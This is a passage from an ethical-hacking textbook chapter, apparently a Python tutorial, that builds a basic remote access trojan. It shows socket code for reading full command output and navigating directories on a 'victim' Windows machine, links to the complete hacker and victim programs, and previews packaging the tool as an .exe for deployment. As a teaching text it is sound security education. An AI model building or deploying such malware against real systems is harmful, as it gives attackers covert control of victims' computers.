			<p>As you can see, we can only receive 1,024 bytes. This is not what we want. To get the complete result, we need to make some modifications. On the victim program, we will append a special <strong class="bold">identifier</strong> to the end of <strong class="source-inline">command_result</strong>. Using this <a id="_idIndexMarker391"/>identifier, we will keep reading data in the hacker program until we reach the identifier. This will act as a marker for the hacker program to know that we have finished receiving all the data and can stop now. </p>
			<p>The identifier string will be as follows:</p>
			<p class="source-code">IDENTIFIER = "&lt;END_OF_COMMAND_RESULT&gt;"</p>
			<p>To add this identifier to <strong class="source-inline">command_result</strong>, we will first decode the result from bytes to string, then append the identifier at the end, and finally again convert the string into bytes, as shown: </p>
			<p class="source-code">      command_result = output.stdout</p>
			<p class="source-code">      command_result = command_result.decode("utf-8") + IDENTIFIER</p>
			<p class="source-code">      command_result = command_result.encode("utf-8")</p>
			<p>This time, instead of using the <strong class="source-inline">send()</strong> method, we will use the <strong class="source-inline">sendall()</strong> method. </p>
			<p>On the hacker side, we will define the exact same identifier, so we can match it. Now, instead of just receiving 1,024 bytes, we will add a <strong class="source-inline">while</strong> loop, which will continuously receive data and store it in an array until we find the identifier, and then we will remove the identifier and store the rest of the result. </p>
			<p>Take a look at the following receiving code:</p>
			<p class="source-code">            full_command_result = b"</p>
			<p class="source-code">            while True:</p>
			<p class="source-code">                chunk = hacker_socket.recv(1048)</p>
			<p class="source-code">                if chunk.endswith(IDENTIFIER.encode()):</p>
			<p class="source-code">                    chunk = chunk[:-len(IDENTIFIER)]</p>
			<p class="source-code">                    full_command_result += chunk</p>
			<p class="source-code">                    break</p>
			<p class="source-code">                full_command_result +=chunk</p>
			<p class="source-code">            print(full_command_result.decode())</p>
			<p>We define<a id="_idIndexMarker392"/> a <strong class="source-inline">full_command_result</strong> variable that will hold the complete result. Then we write a loop to read the buffer continuously until we reach the identifier. Once the identifier is reached, we remove the identifier from the result, add the remaining bytes to <strong class="source-inline">full_command_result</strong>, break the loop, and finally decode it to print. The complete program for the hacker is shown here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py</a>.</p>
			<p>Similarly, the complete program for the victim is shown here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py</a>.</p>
			<p>Now we have developed a program for a hacker that will execute commands on the Windows victim machine and return a complete result to the hacker. This program will work perfectly. However, the command for changing the directory will not work properly on this since we are only working with the input and output of the command result. Next, we will focus on making a program so that we can even navigate directories as well. If you go to your Windows machine and open a Command Prompt, you can use the <strong class="source-inline">cd</strong> command to navigate directories, and we will use a similar approach here as well. So, when the user enters a change directory command, we will move into a different directory in the victim's machine based on the command given. In this section, we learned how we can run <a id="_idIndexMarker393"/>commands from the hacker program and get the results back to the hacker. In the next section, we will learn how we can navigate directories on the victim's computer by giving commands from the hacker program. </p>
			<h1 id="_idParaDest-144"><a id="_idTextAnchor150"/>Navigating directories</h1>
			<p>We will <a id="_idIndexMarker394"/>use a new module to change directory, called the <strong class="source-inline">os</strong> module. This module is included in Python's standard library, so you don't need to install it. Simply import the module in your program by writing the following command: </p>
			<p class="source-code">import os</p>
			<p>The first thing we need to do is to detect when the user enters the <strong class="source-inline">cd</strong> command in the hacker program. This can be done by calling the <strong class="source-inline">startswith()</strong> method on the string command. We will detect the command, send the command to the victim program, and then skip the rest of the loop as follows: </p>
			<p class="source-code">if command.startswith("cd"):</p>
			<p class="source-code">    hacker_socket.send(command.encode())</p>
			<p class="source-code">    continue</p>
			<p>Our first part of the program is now complete. Next, we need to receive this command on the victim program, decode it, check the type of command, such as to navigate the directory, and then find the path we want to move to. Let's say if we want to move back in the directory (one step up in the hierarchy), we enter the following command: </p>
			<p class="source-code">cd ..</p>
			<p><strong class="source-inline">cd</strong> is the name of the command and <strong class="source-inline">..</strong> is the path we want to move to. So, on the victim program, we will first use the same check condition to see whether <strong class="source-inline">hacker_command</strong> starts with <strong class="source-inline">cd</strong>. If it does, we will strip the command to retrieve the path we want to move into. And finally, we will use the <strong class="source-inline">os.chdir()</strong> method to navigate to the entered directory if it exists: </p>
			<p class="source-code">if hacker_command.startswith("cd"):</p>
			<p class="source-code">    path2move = hacker_command.strip("cd ")</p>
			<p class="source-code">    if os.path.exists(path2move):</p>
			<p class="source-code">        os.chdir(path2move)</p>
			<p class="source-code">    else:</p>
			<p class="source-code">        print("can't change directory to ", path2move)</p>
			<p class="source-code">    continue</p>
			<p>In Windows, you can see the current directory by giving the <strong class="source-inline">pwd</strong> (present working directory) command in the shell. Let's now run the hacker and victim programs to see <a id="_idIndexMarker395"/>how we can navigate directories: </p>
			<div>
				<div id="_idContainer109" class="IMG---Figure">
					<img src="image/B14788_06_10.jpg" alt="Figure 6.10 – Changing directory &#13;&#10;"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.10 – Changing directory </p>
			<p>As you can see in the preceding screenshot, we first navigate up in the folder by using the <strong class="source-inline">cd ..</strong> command and move to the <strong class="source-inline">user</strong> folder. Then, we navigate to the Desktop folder by means of the <strong class="source-inline">cd Desktop</strong> command. This way, we can move up or down in the filesystem. The complete code for the hacker program is given <a id="_idIndexMarker396"/>here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example08-hacker-malware/hacker.py</a>.</p>
			<p>Similarly, the <a id="_idIndexMarker397"/>complete code for the victim program is shown here: <a href="https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py">https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py</a>.</p>
			<p>This preceding program will allow the hacker to execute commands and give basic control of the victim's PC to the hacker. The hacker can use this as a template to build more advanced functionalities into the program. You may be thinking that whatever code we have written so far is in the form of a Python script, and in order to deploy it and make a successful hacking attempt, the victim PC must have Python installed and the script should be run manually, which does not seem like a very good idea. Do not worry. In <a href="B14788_08_Final_JC_ePub.xhtml#_idTextAnchor160"><em class="italic">Chapter 8</em></a>, <em class="italic">Post Exploitation</em>, we will look at how we can bundle our Python code into a single executable file <a id="_idIndexMarker398"/>with all the dependencies included inside it. This way, we do not have to worry about whether the victim has Python installed. We will create an <strong class="source-inline">.exe</strong> file from our script and deploy it to the victim. More about this in the next chapter. </p>
			<h1 id="_idParaDest-145"><a id="_idTextAnchor151"/>Summary</h1>
			<p>In this chapter, we began by learning about socket programming and then learned about how we can use sockets to create a network application. Our network application included a hacker and victim program, which helped us to send Windows system commands from a Linux-based hacker program, execute them on Windows, and get the results back to the hacker. We also learned how to navigate the file stream as well. Our basic version of the RAT is complete. Even though it is limited in its functionalities, it gives us a solid understanding of the basics to create a far more advanced malware program. In the next chapter, we will add some more features to our RAT, such as transferring files. See you in the next chapter!</p>
		</div>
	</body></html>